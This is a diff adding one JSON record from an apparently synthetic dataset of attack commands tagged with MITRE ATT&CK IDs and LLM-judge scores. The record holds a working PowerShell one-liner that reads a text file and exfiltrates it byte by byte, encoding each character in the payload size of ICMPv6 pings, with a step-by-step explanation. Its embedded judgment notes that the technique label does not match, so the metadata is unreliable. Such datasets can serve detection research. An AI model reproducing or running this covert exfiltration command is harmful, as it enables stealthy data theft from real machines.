@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::a%11'; $s=Get-Content -Path 'C:\\Users\\Public\\message.txt' -Raw; $s.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (700 + [byte][char]$_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Exfiltrates plaintext characters by mapping each char code into ICMPv6 payload size using Test-Connection, leveraging ICMPv6 as the exfil medium per T1011.",
+  "rationale_steps": [
+    "Read the text into memory.",
+    "For each character, convert to its byte value and offset it.",
+    "Send ICMPv6 echoes with payload sizes the receiver can decode."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-31058b99",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with correct parameter names, balanced delimiters, and valid pipelines for Windows PowerShell.",
+        "semantic_score": 3,
+        "semantic_justification": "The command plausibly exfiltrates data via ICMPv6 by varying payload size, but it does not align with the provided technique description (System Script Proxy Execution) and mislabels the ATT&CK ID.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T22:35:05.794897Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
